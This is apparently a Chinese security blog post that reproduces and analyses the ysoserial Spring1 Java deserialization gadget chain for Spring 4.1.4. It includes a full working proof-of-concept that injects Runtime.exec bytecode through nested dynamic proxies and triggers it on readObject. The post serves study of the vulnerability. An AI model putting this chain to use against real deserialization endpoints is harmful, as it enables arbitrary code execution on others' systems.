# 环境搭建

```
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-core</artifactId>
    <version>4.1.4.RELEASE</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-beans</artifactId>
    <version>4.1.4.RELEASE</version>
</dependency>
```

# 漏洞复现

```
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;

public class Spring1 {

    public static String fileName = "Spring1.bin";

    public static void main(String[] args) throws Exception {

        // 生成包含恶意类字节码的 TemplatesImpl 类
        ClassPool pool = ClassPool.getDefault();
        CtClass STU = pool.makeClass("T0WN");
        String cmd = "Runtime.getRuntime().exec(\"open -a Calculator\");";
        STU.makeClassInitializer().insertBefore(cmd);
        STU.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[][] bytes = new byte[][]{STU.toBytecode()};

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", bytes);
        setFieldValue(templates, "_name", "1");
        setFieldValue(templates, "_class", null);

        // 使用 AnnotationInvocationHandler 动态代理
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        HashMap map = new HashMap<>();
        map.put("getObject", templates);

        // 使用动态代理初始化 AnnotationInvocationHandler
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);

        // 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，使其返回 TemplatesImpl
        ObjectFactory factory = (ObjectFactory<?>) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(), new Class[]{ObjectFactory.class}, invocationHandler);

        // ObjectFactoryDelegatingInvocationHandler 的 invoke 方法触发 ObjectFactory 的 getObject
        // 并且会调用 method.invoke(返回值,args)
        // 此时返回值被我们使用动态代理改为了 TemplatesImpl
        // 接下来需要 method 是 newTransformer()，就可以触发调用链了
        Class clazz = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
        Constructor ofdConstructor = clazz.getDeclaredConstructors()[0];
        ofdConstructor.setAccessible(true);
        // 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler
        InvocationHandler ofdHandler = (InvocationHandler) ofdConstructor.newInstance(factory);

        // ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler
        // 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法
        // 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
        // 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法
        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{Type.class, Templates.class}, ofdHandler);


        // 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类
        HashMap map2 = new HashMap();
        map2.put("getType", typeTemplateProxy);

        InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map2);

        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        // 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{typeProviderClass}, newInvocationHandler);


        // 初始化 MethodInvokeTypeProvider
        Class clazz2 = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Constructor cons   = clazz2.getDeclaredConstructors()[0];
        cons.setAccessible(true);
        // 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
        // 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
        Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod("toString"), 0);
        Field field   = clazz2.getDeclaredField("methodName");
        field.setAccessible(true);
        field.set(objects, "newTransformer");

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(fileName));
        objectOutputStream.writeObject(objects);

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(fileName));
        objectInputStream.readObject();
    }
    public static void setFieldValue(Object obj,String fileName,Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fileName);
        field.setAccessible(true);
        field.set(obj,value);
    }

}

```

![image-20230214135324952](images/1.png)

# 漏洞分析

## 错误的想法

在正式分析之前，我们先来看看一种看似可行的方法，入口点都是在`MethodInvokeTypeProvider#readObject`

![image-20230214203943519](images/2.png)

findMethod返回的是一个Method对象，我们来看看invokeMethod

![image-20230214204213707](images/3.png)

可以看到，这里看样子就是一个反射，如果返回的Method是TemplatesImpl的newTransformer方法的话，那么这里就可以直接调用，可能会有这样一个思路，`this.provider.getType()`是TemplatesImpl对象，this.methodName是newTransfomer，这样就可以直接去调用newTransformer方法然后加载字节码了

至于`this.provider.getType()`怎么控制为TemplatesImpl对象，可以用动态代理的方式

在AnnotationInvocationHandler的invoke方法中

```
public Object invoke(Object var1, Method var2, Object[] var3) {
       String var4 = var2.getName();
       Class[] var5 = var2.getParameterTypes();
       if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
           return this.equalsImpl(var3[0]);
       } else if (var5.length != 0) {
           throw new AssertionError("Too many parameters for an annotation method");
...
           default:
           	//从memberValues属性中获取对象并返回
               Object var6 = this.memberValues.get(var4);
               if (var6 == null) {
                   throw new IncompleteAnnotationException(this.type, var4);
               } else if (var6 instanceof ExceptionProxy) {
                   throw ((ExceptionProxy)var6).generateException();
               } else {
                   if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                       var6 = this.cloneArray(var6);
                   }

                   return var6;
               }
```

可以控制memberValues这个map获取对应key的value值，这条只要控制memberValues的value值为TemplatesImpl对象即可拿到对应的对象，但是ysoserial里面的链子可没有这么短，这样也是行不通的

为什么呢，那是因为这个getTpye方法的返回值并不是一个Object，而是Type类型

![image-20230214205116137](images/4.png)

而我们直接返回`TemplatesImpl`类型会导致类型转换错误而失败

## 真正的分析过程

`org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler` 是 InvocationHandler 的实现类，实例化时接收一个 ObjectFactory 对象，并在 invoke 代理时调用 ObjectFactory 的 getObject 方法返回 ObjectFactory 的实例用于 Method 的反射调用

![image-20230214214817431](images/5.png)

ObjectFactory 的 getObject 方法返回的对象是泛型的，那就可以可用 AnnotationInvocationHandler 来代理，返回任意对象

真正跳转到newTransformer方法的是这里的invoke

而因为这个类也是InvocationHandler的实现类，大佬居然想到了三层动态代理嵌套的方式去实现，第一层动态代理调用AnnotationInvocationHandler的invoke方法，来返回一个代理实例（Object类型），这样就可以强制转换为Type类型返回，因为返回的是一个代理实例，接下来用invokeMethod的invoke方法进行方法调用的时候触发ObjectFactoryDelegatingInvocationHandler的invoke方法，在ObjectFactoryDelegatingInvocationHandler的invoke方法中，`this.objectFactory.getObject`可以返回一个Object对象，这里利用动态代理返回TemplatesImpl对象，而从一至终，method都是TemplatesImpl的newTransformer方法

在了解了这个思路后，我们从readObject跟过来看看

![image-20230215122839678](images/6.png)

这里我们将this,provider控制为一个动态代理对象，代理的是org.springframework.core.SerializableTypeWrapper$TypeProvider类去调用其getType方法，通过AnnotationInvocationHandler返回一个动态代理对象

```
Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{typeProviderClass}, newInvocationHandler);
// 初始化 MethodInvokeTypeProvider
Class clazz2 = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
Constructor cons   = clazz2.getDeclaredConstructors()[0];
cons.setAccessible(true);
// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod("toString"), 0);
Field field   = clazz2.getDeclaredField("methodName");
field.setAccessible(true);
field.set(objects, "newTransformer");
```

注意这里methodName需要在实例化后反射去赋值

跟进invokeMethod

![image-20230215123312775](images/7.png)

这里的target是我们返回的动态代理对象，method是newTransformer方法，前面说到了这个返回的代理对象需要被强转位Type类型，所以需要实现Type接口，另外在这里需要去找到newTransformer方法，则需要实现Templates接口，使用ObjectFactoryDelegatingInvocationHandler作为handler，调用其invoke方法

```
Class clazz = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
Constructor ofdConstructor = clazz.getDeclaredConstructors()[0];
ofdConstructor.setAccessible(true);
// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler
InvocationHandler ofdHandler = (InvocationHandler) ofdConstructor.newInstance(factory);

// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler
// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法
// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法
Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Type.class, Templates.class}, ofdHandler);
```

![image-20230215124816050](images/8.png)

此时的method仍然是TemplatesImpl的newTransformer方法，现在我们只需要控制`this.objectFactory.getObject`返回的是TemplatesImpl对象即可

![image-20230215124939875](images/9.png)

这里的 getObject返回的是java类型，是可以为TemplatesImpl对象的，仍然用AnnotationInvocationHandler返回TemplatesImpl对象

args为空，调用TemplatesImpl的newTransformer方法

![image-20230215125251544](images/10.png)

然后就是加载字节码了，就不分析了



# 写在最后

经过Spring1和jdk7u21的链子分析后，对动态代理的使用更熟悉了，在动态代理使用的过程中，我们不仅要注意调用方法的接口，还需要关注经过invoke的返回值是否符合对应方法返回的类型



参考链接

https://su18.org/post/ysoserial-su18-3/#spring1

[Spring1利用链分析 | 藏青's BLOG (cangqingzhe.github.io)](https://cangqingzhe.github.io/2022/05/06/Spring1利用链分析/)

